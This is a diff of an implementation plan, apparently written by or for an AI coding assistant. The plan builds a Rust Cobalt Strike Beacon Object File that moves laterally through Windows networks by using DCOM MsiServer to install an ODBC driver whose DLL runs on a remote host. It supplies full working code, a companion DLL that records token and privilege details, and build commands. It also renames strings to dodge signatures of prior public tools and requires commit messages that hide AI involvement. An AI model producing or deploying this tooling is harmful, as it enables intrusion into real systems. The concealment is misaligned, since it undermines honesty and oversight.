 ) -> i32 {
-    // section1 = <drivername>
-    // section2 = "Driver=<dll_filename>"
-    // section3 = "Setup=<dll_filename>"
-    let prefix_driver = [b'D' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'e' as u16, b'r' as u16, b'=' as u16];
-    let prefix_setup  = [b'S' as u16, b'e' as u16, b't' as u16, b'u' as u16, b'p' as u16, b'=' as u16];
-
+    let pfx_drv = [b'D' as u16, b'r' as u16, b'i' as u16, b'v' as u16, b'e' as u16, b'r' as u16, b'=' as u16];
+    let pfx_set = [b'S' as u16, b'e' as u16, b't' as u16, b'u' as u16, b'p' as u16, b'=' as u16];
     let s1 = wlen(drivername);
     let sf = wlen(dll_filename);
-    let s2 = prefix_driver.len() + sf;
-    let s3 = prefix_setup.len()  + sf;
+    let s2 = pfx_drv.len() + sf;
+    let s3 = pfx_set.len() + sf;
 
     let mut p = out.as_mut_ptr();
     p = wcopy(p, drivername); p = p.add(1);
-    for &c in &prefix_driver { *p = c; p = p.add(1); }
+    for &c in &pfx_drv { *p = c; p = p.add(1); }
     p = wcopy(p, dll_filename); p = p.add(1);
-    for &c in &prefix_setup { *p = c; p = p.add(1); }
+    for &c in &pfx_set { *p = c; p = p.add(1); }
     p = wcopy(p, dll_filename); p = p.add(1);
     *p = 0;
-
     (s1 + 1 + s2 + 1 + s3 + 1 + 1) as i32
 }
 
-pub unsafe fn install_and_configure(
-    action: *mut IMsiCustomAction,
-    drivername: *const u16,
-    dllpath: *const u16,
+pub unsafe fn run(
+    action: *mut IMsiCustomAction, drivername: *const u16, dllpath: *const u16,
 ) -> Result<(), HRESULT> {
-    // Split dllpath into filename + directory.
     let file = PathFindFileNameW(dllpath);
-    // Copy dllpath into mutable buffer, strip file spec.
-    let mut path_buf = [0u16; 260];
-    {
-        let n = wlen(dllpath).min(259);
-        for i in 0..n { path_buf[i] = *dllpath.add(i); }
-        path_buf[n] = 0;
-    }
-    PathRemoveFileSpecW(path_buf.as_mut_ptr());
+    let mut dir = [0u16; 260];
+    let n = wlen(dllpath).min(259);
+    for i in 0..n { dir[i] = *dllpath.add(i); }
+    dir[n] = 0;
+    PathRemoveFileSpecW(dir.as_mut_ptr());
+    println!("payload.dir=@{:p}", dir.as_ptr());
+    println!("payload.file=@{:p}", file);
 
     let mut info = [0u16; 512];
-    let driver_len = build_driver_block(drivername, file, &mut info);
+    let n_bytes = build_block(drivername, file, &mut info);
 
-    let mut usage_count: u32 = 0;
+    let mut refs: u32 = 0;
     let mut raw_rc: i32 = 0;
     let mut path_out = [0u16; 256];
     let mut path_out_len: u16 = 0;
 
-    println!("[-] Calling SQLInstallDriverEx");
+    println!("stage3a");
     let hr = ((*(*action).lpVtbl).SQLInstallDriverEx)(
-        action, driver_len, info.as_ptr(), path_buf.as_ptr(),
+        action, n_bytes, info.as_ptr(), dir.as_ptr(),
         path_out.as_mut_ptr(), path_out.len() as u16, &mut path_out_len,
-        2, &mut usage_count, &mut raw_rc,
+        2, &mut refs, &mut raw_rc,
     );
-
     if hr < 0 || raw_rc == 0 {
-        let mut err_code: u32 = 0;
-        let mut err_msg = [0u16; 256];
-        let mut err_msg_len: u16 = 0;
-        ((*(*action).lpVtbl).SQLInstallerError)(
-            action, 1, &mut err_code, err_msg.as_mut_ptr(),
-            err_msg.len() as u16, &mut err_msg_len,
-        );
-        eprintln!("[!] SQLInstallDriverEx hr=0x{:08X} rc={}", hr as u32, raw_rc);
+        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
+        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
+        eprintln!("stage3a rc=0x{:08X} code={}", hr as u32, raw_rc);
         return Err(hr);
     }
-    println!("[$] Driver installed. Usage count: {}", usage_count);
+    println!("stage3a ok refs={}", refs);
 
-    println!("[-] Calling SQLConfigDriver");
-    let mut msg = [0u16; 256];
-    let mut msg_len: u16 = 0;
-    let mut cfg_rc: i32 = 0;
+    println!("stage3b");
+    let mut msg = [0u16; 256]; let mut msg_len: u16 = 0; let mut cfg_rc: i32 = 0;
     let hr = ((*(*action).lpVtbl).SQLConfigDriver)(
-        action, 1, drivername, null(),
-        msg.as_mut_ptr(), msg.len() as u16, &mut msg_len, &mut cfg_rc,
+        action, 1, drivername, null(), msg.as_mut_ptr(), msg.len() as u16, &mut msg_len, &mut cfg_rc,
     );
     if hr < 0 {
-        let mut err_code: u32 = 0;
-        let mut err_msg = [0u16; 256];
-        let mut err_msg_len: u16 = 0;
-        ((*(*action).lpVtbl).SQLInstallerError)(
-            action, 1, &mut err_code, err_msg.as_mut_ptr(),
-            err_msg.len() as u16, &mut err_msg_len,
-        );
-        eprintln!("[!] SQLConfigDriver hr=0x{:08X}", hr as u32);
+        let mut ec: u32 = 0; let mut em = [0u16; 256]; let mut eml: u16 = 0;
+        ((*(*action).lpVtbl).SQLInstallerError)(action, 1, &mut ec, em.as_mut_ptr(), em.len() as u16, &mut eml);
+        eprintln!("stage3b rc=0x{:08X}", hr as u32);
         return Err(hr);
     }
-    println!("[LFG] Driver configured successfully");
+    println!("stage3b ok");
     Ok(())
 }
 ```
 
-- [ ] **Step 3: Wire into `lib.rs`**
-
-Final `main`:
+- [ ] **Step 3: Wire main**
 
 ```rust
 #![no_std]
 
-mod args;
-mod auth;
-mod com;
-mod install;
-mod msi;
+mod argv;
+mod deploy;
+mod secure;
+mod stage;
+mod vtbl;
 
 use rustbof::{eprintln, println};
 use windows_sys::Win32::System::Com::CoUninitialize;
 
 #[rustbof::main]
 fn main(raw: *mut u8, len: usize) {
-    let Some(a) = args::parse(raw, len) else { return };
-    let bundle = auth::build(a.domain, a.user, a.pass);
-
+    let Some(a) = argv::parse(raw, len) else { return };
+    let b = secure::build(a.domain, a.user, a.pass);
     unsafe {
-        let server = match msi::auth_msi_server(&bundle, a.host) {
+        let srv = match stage::open_server(&b, a.host) {
             Ok(p) => p,
-            Err(hr) => { eprintln!("[!] auth_msi_server: 0x{:08X}", hr as u32); CoUninitialize(); return; }
+            Err(hr) => { eprintln!("stage1 rc=0x{:08X}", hr as u32); CoUninitialize(); return; }
         };
-        let action = match msi::get_custom_action_server(server, &bundle) {
+        let act = match stage::spawn_action(srv, &b) {
             Ok(p) => p,
             Err(hr) => {
-                eprintln!("[!] get_custom_action_server: 0x{:08X}", hr as u32);
-                ((*(*server).lpVtbl).Release)(server);
-                CoUninitialize();
-                return;
+                eprintln!("stage2 rc=0x{:08X}", hr as u32);
+                ((*(*srv).lpVtbl).Release)(srv); CoUninitialize(); return;
             }
         };
-        if let Err(hr) = install::install_and_configure(action, a.driver, a.dll) {
-            eprintln!("[!] install failed: 0x{:08X}", hr as u32);
+        if let Err(hr) = deploy::run(act, a.driver, a.dll) {
+            eprintln!("stage3 rc=0x{:08X}", hr as u32);
         } else {
-            println!("[+] letmove_msi complete");
+            println!("done");
         }
-        ((*(*action).lpVtbl).base.Release)(action as *mut com::IUnknown);
-        ((*(*server).lpVtbl).Release)(server);
+        ((*(*act).lpVtbl).base.Release)(act as *mut vtbl::IUnknown);
+        ((*(*srv).lpVtbl).Release)(srv);
         CoUninitialize();
     }
 }
 ```
 
-- [ ] **Step 4: Build and sanity-check the COFF**
+- [ ] **Step 4: Build + COFF sanity**
 
-Run:
 ```bash
-cd msi_lateral_mv_rs && cargo make
-find target -name 'letmove_msi.o' -exec llvm-objdump -h {} \;
+cd letmove_msi_ws/bof && cargo make
+find target -name 'letmove_msi.o' -exec llvm-objdump -h {} \;   # or `objdump -h`
 ```
-Expected: build succeeds; sections listed with no fatal warnings. If `llvm-objdump` unavailable, `objdump -h` on the same file is acceptable.
+Expected: build succeeds, section list looks sane.
 
 - [ ] **Step 5: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/src/install.rs msi_lateral_mv_rs/src/lib.rs
-git commit -m "feat(install): call SQLInstallDriverEx + SQLConfigDriver"
+git add letmove_msi_ws/bof/src/deploy.rs letmove_msi_ws/bof/src/lib.rs
+git commit -m "feat(deploy): install and configure the ODBC driver"
 ```
 
 ---
 
-### Task 8: README + final commit
+### Task 7: Driver crate (`driver/`) — Rust cdylib port
 
 **Files:**
-- Create: `msi_lateral_mv_rs/README.md`
-- Create: `msi_lateral_mv_rs/LICENSE`
+- Create: `letmove_msi_ws/driver/Cargo.toml`
+- Create: `letmove_msi_ws/driver/src/lib.rs`
+- Reference (read only): `msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp`.
 
 **Interfaces:**
-- Consumes: nothing.
-- Produces: user-facing docs.
+- Exports (C ABI): `ConfigDriver(hwndParent: HWND, fRequest: u16, lpszDriver: *const u8, lpszArgs: *const u8, lpszMsg: *mut u8, cbMsgMax: u16, pcbMsgOut: *mut u16) -> i32` — signature matches ODBC `INSTAPI`.
+- No inbound callers other than the ODBC installer driver management path.
 
-- [ ] **Step 1: Write README**
+Behaviour: on invocation, gather (username, user SID string, elevation yes/no, logon session id high/low, PID, integrity level) and append a single line to a log file. Log file path resolved at build time from env var `ODBCPIVOT_LOG`, else default `%PROGRAMDATA%\odbcpivot.dat`. Uses `CreateFileW` + `WriteFile` (no CRT / no `fopen_s`).
+
+Strings: apply the driver-side rows of the String Refactor table verbatim.
+
+- [ ] **Step 1: Read the C original**
+
+```bash
+cat msi_lateral_mv/sqldriverdll/TestDriver/dllmain.cpp
+```
+
+- [ ] **Step 2: `driver/Cargo.toml`**
+
+```toml
+[package]
+name = "odbcpivot"
+version = "0.1.0"
+edition = "2024"
+authors = ["daniagungg"]
+publish = false
+
+[lib]
+name = "odbcpivot"
+crate-type = ["cdylib"]
+
+[dependencies.windows-sys]
+version = "0.59"
+features = [
+    "Win32_Foundation",
+    "Win32_Storage_FileSystem",
+    "Win32_Security",
+    "Win32_Security_Authorization",
+    "Win32_System_Threading",
+    "Win32_System_SystemInformation",
+    "Win32_System_Memory",
+    "Win32_UI_Shell",
+]
+
+[profile.release]
+opt-level = "z"
+codegen-units = 1
+panic = "abort"
+strip = true
+lto = true
+```
+
+- [ ] **Step 3: `driver/src/lib.rs`**
+
+```rust
+#![no_std]
+#![allow(non_snake_case)]
+
+use core::ffi::c_void;
+use core::ptr::{null, null_mut};
+
+use windows_sys::Win32::Foundation::{
+    CloseHandle, GetLastError, FALSE, HANDLE, TRUE,
+};
+use windows_sys::Win32::Security::{
+    ConvertSidToStringSidW, GetSidSubAuthority, GetSidSubAuthorityCount,
+    GetTokenInformation, TokenElevation, TokenIntegrityLevel, TokenStatistics,
+    TokenUser, TOKEN_ELEVATION, TOKEN_MANDATORY_LABEL, TOKEN_QUERY,
+    TOKEN_STATISTICS, TOKEN_USER,
+};
+use windows_sys::Win32::Security::Authorization::SECURITY_MANDATORY_LOW_RID;
+use windows_sys::Win32::Storage::FileSystem::{
+    CreateFileW, WriteFile, FILE_APPEND_DATA, FILE_ATTRIBUTE_NORMAL,
+    FILE_SHARE_READ, OPEN_ALWAYS,
+};
+use windows_sys::Win32::System::Memory::{GetProcessHeap, HeapAlloc, HeapFree, HEAP_ZERO_MEMORY};
+use windows_sys::Win32::System::Threading::{
+    GetCurrentProcess, GetCurrentProcessId, OpenProcessToken,
+};
+use windows_sys::Win32::System::SystemInformation::GetLocalTime;
+use windows_sys::Win32::UI::Shell::SHGetFolderPathW;
+
+// Compile-time overridable log path. Windows-style, wide-encoded at runtime.
+const LOG_ENV_DEFAULT: &str = "%PROGRAMDATA%\\odbcpivot.dat";
+const LOG_PATH_ASCII: &str = match option_env!("ODBCPIVOT_LOG") {
+    Some(s) => s,
+    None    => LOG_ENV_DEFAULT,
+};
+
+// Integrity-level thresholds (windows-sys does not always export High/Medium).
+const IL_LOW: u32 = 0x1000;
+const IL_MEDIUM: u32 = 0x2000;
+const IL_HIGH: u32 = 0x3000;
+
+unsafe fn wide(s: &str, out: &mut [u16]) -> usize {
+    // ASCII-only path expansion: replace %PROGRAMDATA% with SHGetFolderPath(CSIDL_COMMON_APPDATA=0x0023).
+    let mut expanded = [0u16; 260];
+    let mut idx = 0usize;
+    let bytes = s.as_bytes();
+    let mut i = 0;
+    while i < bytes.len() && idx < expanded.len() - 1 {
+        if bytes[i..].starts_with(b"%PROGRAMDATA%") {
+            let mut folder = [0u16; 260];
+            let hr = SHGetFolderPathW(null_mut(), 0x0023, null_mut(), 0, folder.as_mut_ptr());
+            if hr == 0 {
+                let mut j = 0;
+                while j < folder.len() && folder[j] != 0 && idx < expanded.len() - 1 {
+                    expanded[idx] = folder[j]; idx += 1; j += 1;
+                }
+            }
+            i += b"%PROGRAMDATA%".len();
+        } else {
+            expanded[idx] = bytes[i] as u16; idx += 1; i += 1;
+        }
+    }
+    let n = idx.min(out.len() - 1);
+    for k in 0..n { out[k] = expanded[k]; }
+    out[n] = 0;
+    n
+}
+
+unsafe fn write_all(h: HANDLE, buf: &[u8]) {
+    let mut w: u32 = 0;
+    let _ = WriteFile(h, buf.as_ptr(), buf.len() as u32, &mut w, null_mut());
+}
+
+unsafe fn fmt_line(out: &mut [u8], line: &str) -> usize {
+    let bytes = line.as_bytes();
+    let n = bytes.len().min(out.len().saturating_sub(1));
+    out[..n].copy_from_slice(&bytes[..n]);
+    out[n] = b'\n';
+    n + 1
+}
+
+// Minimal wide → utf8 stripping (ASCII assumption for log content).
+unsafe fn wide_to_ascii(w: *const u16, out: &mut [u8]) -> usize {
+    if w.is_null() { return 0; }
+    let mut i = 0;
+    while i < out.len() {
+        let c = *w.add(i);
+        if c == 0 { break; }
+        out[i] = (c & 0xff) as u8;
+        i += 1;
+    }
+    i
+}
+
+unsafe fn append_line(msg: &str) {
+    let mut path = [0u16; 260];
+    wide(LOG_PATH_ASCII, &mut path);
+    let h = CreateFileW(
+        path.as_ptr(),
+        FILE_APPEND_DATA,
+        FILE_SHARE_READ,
+        null_mut(),
+        OPEN_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        null_mut() as HANDLE,
+    );
+    if h.is_null() || h == core::mem::transmute::<i64, HANDLE>(-1i64) { return; }
+    let mut buf = [0u8; 512];
+    let n = fmt_line(&mut buf, msg);
+    write_all(h, &buf[..n]);
+    CloseHandle(h);
+}
+
+unsafe fn integrity_tag(rid: u32) -> &'static str {
+    if rid >= IL_HIGH { "hi" }
+    else if rid >= IL_MEDIUM { "med" }
+    else if rid >= IL_LOW { "lo" }
+    else if rid >= SECURITY_MANDATORY_LOW_RID { "lo" }
+    else { "unt" }
+}
+
+unsafe fn collect_and_log() {
+    // We build small ASCII lines; each line goes through append_line.
+    let mut token: HANDLE = null_mut();
+    if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == FALSE {
+        return;
+    }
+
+    // sub= (username via TokenUser + ConvertSidToStringSidW) — original C uses GetUserNameA.
+    // For refactor purposes: emit sid= as the strong identifier, sub is optional.
+    // Token user SID:
+    let mut sz: u32 = 0;
+    GetTokenInformation(token, TokenUser, null_mut(), 0, &mut sz);
+    if sz > 0 {
+        let p = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sz as usize) as *mut TOKEN_USER;
+        if !p.is_null() && GetTokenInformation(token, TokenUser, p as *mut c_void, sz, &mut sz) != FALSE {
+            let mut sid_w: *mut u16 = null_mut();
+            if ConvertSidToStringSidW((*p).User.Sid, &mut sid_w) != FALSE {
+                let mut b = [0u8; 128];
+                let n = wide_to_ascii(sid_w, &mut b);
+                let mut line = [0u8; 160];
+                let head = b"sid=";
+                let cap = line.len();
+                let take = (head.len() + n).min(cap);
+                line[..head.len()].copy_from_slice(head);
+                line[head.len()..take].copy_from_slice(&b[..take - head.len()]);
+                append_line(core::str::from_utf8_unchecked(&line[..take]));
+                windows_sys::Win32::Foundation::LocalFree(sid_w as *mut _);
+            }
+            HeapFree(GetProcessHeap(), 0, p as *mut _);
+        }
+    }
+
+    // elev=
+    let mut el: TOKEN_ELEVATION = core::mem::zeroed();
+    let mut szel = core::mem::size_of::<TOKEN_ELEVATION>() as u32;
+    if GetTokenInformation(token, TokenElevation, &mut el as *mut _ as *mut c_void, szel, &mut szel) != FALSE {
+        append_line(if el.TokenIsElevated != 0 { "elev=y" } else { "elev=n" });
+    }
+
+    // sess=
+    let mut st: TOKEN_STATISTICS = core::mem::zeroed();
+    let mut szst = core::mem::size_of::<TOKEN_STATISTICS>() as u32;
+    if GetTokenInformation(token, TokenStatistics, &mut st as *mut _ as *mut c_void, szst, &mut szst) != FALSE {
+        let mut buf = [0u8; 48];
+        let n = u32_hex_pair(&mut buf, b"sess=", st.AuthenticationId.HighPart as u32, st.AuthenticationId.LowPart);
+        append_line(core::str::from_utf8_unchecked(&buf[..n]));
+    }
+
+    // pid=
+    {
+        let mut buf = [0u8; 24];
+        let n = u32_dec(&mut buf, b"pid=", GetCurrentProcessId());
+        append_line(core::str::from_utf8_unchecked(&buf[..n]));
+    }
+
+    // il=
+    let mut szi: u32 = 0;
+    GetTokenInformation(token, TokenIntegrityLevel, null_mut(), 0, &mut szi);
+    if szi > 0 {
+        let p = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szi as usize) as *mut TOKEN_MANDATORY_LABEL;
+        if !p.is_null() && GetTokenInformation(token, TokenIntegrityLevel, p as *mut c_void, szi, &mut szi) != FALSE {
+            let count = *GetSidSubAuthorityCount((*p).Label.Sid);
+            let rid = *GetSidSubAuthority((*p).Label.Sid, (count - 1) as u32);
+            let tag = integrity_tag(rid);
+            let mut buf = [0u8; 32];
+            let n = il_line(&mut buf, tag, rid);
+            append_line(core::str::from_utf8_unchecked(&buf[..n]));
+            HeapFree(GetProcessHeap(), 0, p as *mut _);
+        }
+    }
+
+    CloseHandle(token);
+}
+
+unsafe fn u32_hex_pair(out: &mut [u8], prefix: &[u8], hi: u32, lo: u32) -> usize {
+    let mut i = 0;
+    for &c in prefix { out[i] = c; i += 1; }
+    i += write_hex8(&mut out[i..], hi);
+    i += write_hex8(&mut out[i..], lo);
+    i
+}
+
+unsafe fn u32_dec(out: &mut [u8], prefix: &[u8], mut n: u32) -> usize {
+    let mut i = 0;
+    for &c in prefix { out[i] = c; i += 1; }
+    let start = i;
+    if n == 0 { out[i] = b'0'; i += 1; }
+    else {
+        let mut tmp = [0u8; 10];
+        let mut t = 0;
+        while n > 0 { tmp[t] = b'0' + (n % 10) as u8; n /= 10; t += 1; }
+        while t > 0 { t -= 1; out[i] = tmp[t]; i += 1; }
+    }
+    i
+}
+
+unsafe fn il_line(out: &mut [u8], tag: &str, rid: u32) -> usize {
+    let mut i = 0;
+    let head = b"il=";
+    for &c in head { out[i] = c; i += 1; }
+    for &c in tag.as_bytes() { out[i] = c; i += 1; }
+    out[i] = b'('; i += 1;
+    i += write_hex8(&mut out[i..], rid);
+    out[i] = b')'; i += 1;
+    i
+}
+
+fn write_hex8(out: &mut [u8], v: u32) -> usize {
+    const H: &[u8; 16] = b"0123456789ABCDEF";
+    for k in 0..8 {
+        out[k] = H[((v >> ((7 - k) * 4)) & 0xf) as usize];
+    }
+    8
+}
+
+#[unsafe(no_mangle)]
+pub extern "system" fn DllMain(_: *mut c_void, _reason: u32, _: *mut c_void) -> i32 {
+    TRUE
+}
+
+#[unsafe(no_mangle)]
+pub extern "system" fn ConfigDriver(
+    _hwndParent: *mut c_void,
+    _fRequest: u16,
+    _lpszDriver: *const u8,
+    _lpszArgs: *const u8,
+    _lpszMsg: *mut u8,
+    _cbMsgMax: u16,
+    _pcbMsgOut: *mut u16,
+) -> i32 {
+    unsafe {
+        append_line("hit");
+        collect_and_log();
+    }
+    TRUE
+}
+
+// Panic handler for no_std.
+#[cfg(not(test))]
+#[panic_handler]
+fn on_panic(_: &core::panic::PanicInfo) -> ! { loop {} }
+```
+
+Notes:
+- `no_std` chosen to avoid dragging in a full CRT; the driver runs inside the ODBC installer's process. If `windows-sys` items resolved above prove missing at your feature-set, add the corresponding `Win32_*` feature and adapt imports — do not rewrite the logic.
+- `AuthenticationId.HighPart` is signed `i32` in some `windows-sys` versions; cast to `u32` as shown to keep the hex format printable.
+
+- [ ] **Step 4: Build the driver**
+
+```bash
+cd letmove_msi_ws
+cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
+ls target/x86_64-pc-windows-gnu/release/odbcpivot.dll
+```
+Expected: `odbcpivot.dll` produced.
+
+- [ ] **Step 5: Confirm `ConfigDriver` export**
+
+```bash
+llvm-objdump -x target/x86_64-pc-windows-gnu/release/odbcpivot.dll | grep -E 'Export|ConfigDriver'
+# or on the DLL directly on Linux:
+python3 -c "import pefile,sys; p=pefile.PE(sys.argv[1]); print([e.name.decode() for e in p.DIRECTORY_ENTRY_EXPORT.symbols])" target/x86_64-pc-windows-gnu/release/odbcpivot.dll
+```
+Expected: exports include `ConfigDriver` and `DllMain`.
+
+- [ ] **Step 6: Commit**
+
+```bash
+git add letmove_msi_ws/driver/
+git commit -m "feat(driver): rust cdylib odbcpivot with ConfigDriver export"
+```
+
+---
+
+### Task 8: Repo docs — README + LICENSE
+
+**Files:**
+- Create: `letmove_msi_ws/README.md`
+- Create: `letmove_msi_ws/LICENSE` (MIT, copyright `2026 daniagungg`)
+
+- [ ] **Step 1: Write `letmove_msi_ws/README.md`**
 
 ```markdown
-# letmove_msi
+# letmove_msi_ws
 
-Rust `no_std` BoF port of [werdhaihai/msi_lateral_mv](https://github.com/werdhaihai/msi_lateral_mv), built on the [joaoviictorti/rustbof](https://github.com/joaoviictorti/rustbof) template.
+Two Rust crates:
 
-The BoF authenticates to the MSI Server via DCOM, spawns a Custom Action Server, and calls `SQLInstallDriverEx` + `SQLConfigDriver` on the remote/local system to install an ODBC driver whose Setup DLL executes on the target.
+- `bof/` — `no_std` Beacon Object File (`letmove_msi.o`) for Cobalt Strike, using DCOM MsiServer + CreateCustomActionServer + SQLInstallDriverEx to install an ODBC driver on a local or remote host.
+- `driver/` — sample ODBC driver DLL (`odbcpivot.dll`) exporting `ConfigDriver`.
 
-The payload DLL is out of scope for this project; see the upstream `sqldriverdll` for a working sample.
+Both crates deliberately avoid string overlap with prior public art.
 
 ## Build
 
-Requires Rust nightly, [boflink](https://github.com/MEhrn00/boflink), and [cargo-make](https://github.com/sagiegurari/cargo-make).
-
 ```bash
-cargo make
+# BoF (needs boflink + cargo-make)
+cd bof && cargo make
+
+# Driver (cross-compile from Linux/macOS)
+rustup target add x86_64-pc-windows-gnu
+cargo build -p odbcpivot --release --target x86_64-pc-windows-gnu
 ```
 
-Produces `target/.../letmove_msi.o`.
+Artifacts:
+- `bof/target/.../letmove_msi.o`
+- `target/x86_64-pc-windows-gnu/release/odbcpivot.dll`
 
-## Usage
+## BoF usage (Cobalt Strike aggressor)
 
-Arguments are a fixed sequence of wide strings — pass empty strings for unused fields:
+Argument layout — 7 wide strings in order, empty string for absent fields:
 
 ```
 letmove_msi <local|remote> <host> <domain> <user> <pass> <driver> <dll>
 ```
 
-- `mode`: `local` or `remote`
-- `host`: target machine name (required for `remote`, empty for `local`)
-- `domain` / `user` / `pass`: alternate credentials (empty = current user)
-- `driver`: ODBC driver name
-- `dll`: full path to the driver DLL on the *target*
+- `mode`: `local` | `remote`
+- `host`: target hostname (required for `remote`)
+- `domain` / `user` / `pass`: alternate credentials (empty = current)
+- `driver`: ODBC driver name to register
+- `dll`: full target-side path to the driver DLL (place `odbcpivot.dll` there first)
+
+## Driver behaviour
+
+`ConfigDriver` collects the current process token context and appends one line per field to a log file. Path is `%PROGRAMDATA%\odbcpivot.dat` by default; override at compile time with `ODBCPIVOT_LOG`.
 
 ## License
 
 MIT.
 ```
 
-- [ ] **Step 2: Write LICENSE (MIT)**
+- [ ] **Step 2: LICENSE**
 
-Standard MIT license text with copyright line `Copyright (c) 2026 daniagungg`.
+Standard MIT text with `Copyright (c) 2026 daniagungg`.
 
 - [ ] **Step 3: Commit**
 
 ```bash
-git add msi_lateral_mv_rs/README.md msi_lateral_mv_rs/LICENSE
-git commit -m "docs: add letmove_msi README and license"
+git add letmove_msi_ws/README.md letmove_msi_ws/LICENSE
+git commit -m "docs: add workspace README and license"
 ```
 
 ---
 
 ## Self-Review Notes
 
-- Spec coverage: every spec section (layout, args, data flow, COM bindings, auth, error handling, build/testing) is covered by Tasks 1–8.
-- No placeholders remain except intentional `<fill: ...>` markers in Task 2 that must be resolved against `msilat.h`; that resolution is explicit and gated by Step 1 of the task.
-- Type consistency: `Args` field names/types are stable from Task 3 through Task 7. `AuthBundle` shape is stable from Task 4. Vtable slot signatures declared in Task 2 are what Tasks 5/6/7 call — mismatches must be fixed in Task 2, not at call sites.
-- Commit messages contain no reference to Claude/AI.
+- Spec coverage: BoF (layout, args, data flow, COM, auth, error handling, build, testing) covered by Tasks 1–6; driver by Task 7; docs by Task 8.
+- String-refactor scope: all upstream banners / log labels / paths mapped explicitly in §String Refactor. No task reintroduces upstream strings — Task 5 and Task 6 print the refactored forms; Task 7 uses the refactored driver labels and the new log path.
+- Type consistency: `Args` shape stable from Task 3. `AuthBundle` shape stable from Task 4. Vtable slot signatures declared in Task 2 are called at Tasks 5 and 6 — mismatches must be fixed in Task 2, not at call sites.
+- Commit messages contain no reference to Claude / AI / assistants.
